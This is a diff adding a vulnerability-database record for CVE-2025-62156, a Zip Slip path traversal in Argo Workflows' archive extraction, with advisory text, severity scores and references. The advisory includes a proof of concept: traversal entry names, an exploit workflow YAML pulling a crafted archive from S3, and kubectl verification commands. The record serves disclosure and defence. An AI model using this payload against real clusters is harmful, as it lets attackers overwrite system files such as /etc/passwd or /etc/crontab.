@@ -1,0 +1,271 @@
+vulnerability_id: VCID-m25f-b6k7-b7eh
+aliases:
+  - CVE-2025-62156
+  - GHSA-p84v-gxvw-73pf
+summary: "Argo Workflow has a Zipslip Vulnerability\n### **Vulnerability Description**\n\n####\
+  \ Vulnerability Overview\n\n1. During the artifact extraction process, the `unpack()` function\
+  \ extracts the compressed file to a temporary directory (`/etc.tmpdir`) and then attempts\
+  \ to move its contents to `/etc` using the `rename()` system call,\n2. However, since `/etc`\
+  \ is an already existing system directory, the `rename()` system call fails, making normal\
+  \ archive extraction impossible.\n3. At this point, if a malicious user sets the entry name\
+  \ inside the `tar.gz` file to a path traversal like `../../../../../etc/zipslip-poc`,\n4.\
+  \ The `untar()` function combines paths using `filepath.Join(dest, filepath.Clean(header.Name))`\
+  \ without path validation, resulting in `target = \"/work/input/../../../../../etc/zipslip-poc\"\
+  `,\n5. Ultimately, the `/etc/zipslip-poc` file is created, bypassing the normal archive extraction\
+  \ constraints and enabling direct file writing to system directories.\n\n#### untar(): Writing\
+  \ Files Outside the Extraction Directory\n\nhttps://github.com/argoproj/argo-workflows/blob/946a2d6b9ac3309371fe47f49ae94c33ca7d488d/workflow/executor/executor.go#L993\n\
+  \n1. **Base Path**: `/work/tmp` (dest) — The intended extraction directory in the wait container\
+  \  \n2. **Malicious Entry**: `../../../../../../../../../..//mainctrfs/etc/zipslip-ok.txt`\
+  \ (`header.Name`) — Path traversal payload  \n3. **Path Cleaning**: `filepath.Clean(\"../../../../../../../../../..//mainctrfs/etc/zipslip-ok.txt\"\
+  ) = /mainctrfs/etc/zipslip-ok.txt` — Go’s path cleaning normalizes the traversal  \n4. **Path\
+  \ Joining**: `filepath.Join(\"/work/tmp\", \"/mainctrfs/etc/zipslip-ok.txt\") = /mainctrfs/etc/zipslip-ok.txt`\
+  \ — Absolute path overrides base directory  \n5. **File Creation**: `/mainctrfs/etc/zipslip-ok.txt`\
+  \ file is created in the wait container  \n6. **Volume Mirroring**: The file appears as `/etc/zipslip-ok.txt`\
+  \ in the main container due to volume mount mirroring\n\n### PoC\n\n#### PoC Description\n\
+  \n1. The user uploaded a malicious `tar.gz` file to S3 that contains path traversal entries\
+  \ like `../../../../../../../../../..//mainctrfs/etc/zipslip-ok.txt` designed to exploit the\
+  \ vulnerability.\n2. In the Argo Workflows YAML, the artifact’s path is set to `/work/tmp`,\
+  \ which should normally extract the archive to that intended directory.\n3. However, due to\
+  \ the vulnerability in the `untar()` function, `filepath.Join(\"/work/tmp\", \"/mainctrfs/etc/zipslip-ok.txt\"\
+  )` resolves to `/mainctrfs/etc/zipslip-ok.txt`, causing files to be created in unintended\
+  \ locations.\n4. Since the wait container’s `/mainctrfs/etc` and the main container’s `/etc`\
+  \ share the same volume, files created in the wait container become visible in the main container’s\
+  \ `/etc/` directory.\n5. Consequently, the archive that should extract to `/work/tmp` exploits\
+  \ the Zip Slip vulnerability to create files in the `/etc/` directory, enabling manipulation\
+  \ of system configuration files.\n\n#### exploit yaml\n\n```yaml\napiVersion: argoproj.io/v1alpha1\n\
+  kind: Workflow\nmetadata:\n  generateName: zipslip-\nspec:\n  entrypoint: main\n  templates:\n\
+  \  - name: main\n    container:\n      image: ubuntu:22.04\n      command: [\"sh\"]\n    \
+  \  args: [\"-c\", \"echo 'Starting container'; sleep 3000\"]\n      volumeMounts:\n      -\
+  \ name: etcvol\n        mountPath: /etc\n    inputs:\n      artifacts:\n      - name: evil\n\
+  \        path: /work/tmp  \n        archive:\n          tar: {}\n        http:\n         \
+  \ url: \"https://zipslip-s3.s3.ap-northeast-2.amazonaws.com/etc-poc.tgz\"\n    volumes:\n\
+  \    - name: etcvol\n      emptyDir: {}\n```\n\n#### exploit\n\n1. Create Zipslip  \n<img\
+  \ width=\"1300\" height=\"102\" alt=\"image (4)\" src=\"https://github.com/user-attachments/assets/74569df1-43f9-409d-b905-601bcb5998e2\"\
+  \ />\n\n2. Upload S3  \n<img width=\"1634\" height=\"309\" alt=\"image (5)\" src=\"https://github.com/user-attachments/assets/2bf4a90a-0f03-411d-9a31-3c7de4b399b4\"\
+  \ />\n\n\n3. Create Workflow  \n<img width=\"1875\" height=\"865\" alt=\"image (1) (1)\" src=\"\
+  https://github.com/user-attachments/assets/fd01a4a7-c400-47a2-a8f0-427b0feabc7f\" />\n\n\n\
+  4. Run  \n<img width=\"1799\" height=\"862\" alt=\"image (2)\" src=\"https://github.com/user-attachments/assets/18a68919-1529-4ca0-9ed4-b71e271ae38f\"\
+  \ />\n\n\n5. Exploit Success\n<img width=\"1363\" height=\"440\" alt=\"image (3)\" src=\"\
+  https://github.com/user-attachments/assets/ac0e834d-4734-4771-9d24-d6fd1ce5d77f\" />\n\n \
+  \  ```bash\n   # Find Workflow and Pod\n   NS=default\n   WF=$(kubectl get wf -n \"$NS\" --sort-by=.metadata.creationTimestamp\
+  \ --no-headers | awk 'END{print $1}')\n   POD=$(kubectl get pod -n \"$NS\" -l workflows.argoproj.io/workflow=\"\
+  $WF\" --no-headers | awk 'END{print $1}')\n   echo \"NS=$NS WF=$WF POD=$POD\"\n   \n   # Connect\
+  \ Main Container\n   kubectl exec -it -n \"$NS\" \"$POD\" -c main -- bash\n   \n   # Exploit\n\
+  \   cd /etc/\n   ls -l\n   cat zipslip-ok.txt\n   ```\n\n### Impact\n\n#### Container Isolation\
+  \ Bypass\n\nThe Zip Slip vulnerability allows attackers to write files to system directories\
+  \ like `/etc/` within the container, potentially overwriting critical configuration files\
+  \ such as `/etc/passwd`, `/etc/hosts`, or `/etc/crontab`, which could lead to privilege escalation\
+  \ or persistent access within the compromised container."
+severities:
+  - score: '7.1'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L
+    published_at: None
+    url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-62156.json
+  - score: '0.00073'
+    scoring_system: epss
+    scoring_elements: '0.22845'
+    published_at: '2025-10-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00073'
+    scoring_system: epss
+    scoring_elements: '0.22756'
+    published_at: '2025-10-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00073'
+    scoring_system: epss
+    scoring_elements: '0.22805'
+    published_at: '2025-10-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00073'
+    scoring_system: epss
+    scoring_elements: '0.22832'
+    published_at: '2025-10-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00073'
+    scoring_system: epss
+    scoring_elements: '0.22849'
+    published_at: '2025-10-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00082'
+    scoring_system: epss
+    scoring_elements: '0.24886'
+    published_at: '2025-10-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00082'
+    scoring_system: epss
+    scoring_elements: '0.24894'
+    published_at: '2025-10-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00082'
+    scoring_system: epss
+    scoring_elements: '0.24907'
+    published_at: '2025-10-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00082'
+    scoring_system: epss
+    scoring_elements: '0.24824'
+    published_at: '2025-10-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00082'
+    scoring_system: epss
+    scoring_elements: '0.24858'
+    published_at: '2025-11-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00082'
+    scoring_system: epss
+    scoring_elements: '0.24925'
+    published_at: '2025-11-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00082'
+    scoring_system: epss
+    scoring_elements: '0.24891'
+    published_at: '2025-10-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00082'
+    scoring_system: epss
+    scoring_elements: '0.24888'
+    published_at: '2025-10-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00082'
+    scoring_system: epss
+    scoring_elements: '0.24884'
+    published_at: '2025-10-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00108'
+    scoring_system: epss
+    scoring_elements: '0.29822'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '0.00108'
+    scoring_system: epss
+    scoring_elements: '0.29855'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/blob/946a2d6b9ac3309371fe47f49ae94c33ca7d488d/workflow/executor/executor.go#L993
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/blob/946a2d6b9ac3309371fe47f49ae94c33ca7d488d/workflow/executor/executor.go#L993
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-14T16:04:17Z/
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/blob/946a2d6b9ac3309371fe47f49ae94c33ca7d488d/workflow/executor/executor.go#L993
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/commit/5659ad9b641fcf52c04ed594cd6493f9170f6011
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/commit/5659ad9b641fcf52c04ed594cd6493f9170f6011
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-14T16:04:17Z/
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/commit/5659ad9b641fcf52c04ed594cd6493f9170f6011
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/commit/9f6bc5d236cd1b24d607943384511d71ad17a4c3
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/commit/9f6bc5d236cd1b24d607943384511d71ad17a4c3
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-14T16:04:17Z/
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/commit/9f6bc5d236cd1b24d607943384511d71ad17a4c3
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/security/advisories/GHSA-p84v-gxvw-73pf
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/security/advisories/GHSA-p84v-gxvw-73pf
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-14T16:04:17Z/
+    published_at: None
+    url: https://github.com/argoproj/argo-workflows/security/advisories/GHSA-p84v-gxvw-73pf
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-62156
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-62156
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
+    published_at: None
+    url: https://pkg.go.dev/vuln/GO-2025-4023
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://pkg.go.dev/vuln/GO-2025-4023
+weaknesses:
+  - CWE-22
+  - CWE-23
+references:
+  - url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-62156.json
+    reference_type:
+    reference_id:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-62156
+    reference_type:
+    reference_id:
+  - url: https://github.com/argoproj/argo-workflows
+    reference_type:
+    reference_id:
+  - url: https://github.com/argoproj/argo-workflows/blob/946a2d6b9ac3309371fe47f49ae94c33ca7d488d/workflow/executor/executor.go#L993
+    reference_type:
+    reference_id:
+  - url: https://github.com/argoproj/argo-workflows/commit/5659ad9b641fcf52c04ed594cd6493f9170f6011
+    reference_type:
+    reference_id:
+  - url: https://github.com/argoproj/argo-workflows/commit/9f6bc5d236cd1b24d607943384511d71ad17a4c3
+    reference_type:
+    reference_id:
+  - url: https://github.com/argoproj/argo-workflows/security/advisories/GHSA-p84v-gxvw-73pf
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-62156
+    reference_type:
+    reference_id:
+  - url: https://pkg.go.dev/vuln/GO-2025-4023
+    reference_type:
+    reference_id:
+  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2403800
+    reference_type:
+    reference_id: 2403800
+  - url: https://access.redhat.com/errata/RHSA-2025:22759
+    reference_type:
+    reference_id: RHSA-2025:22759
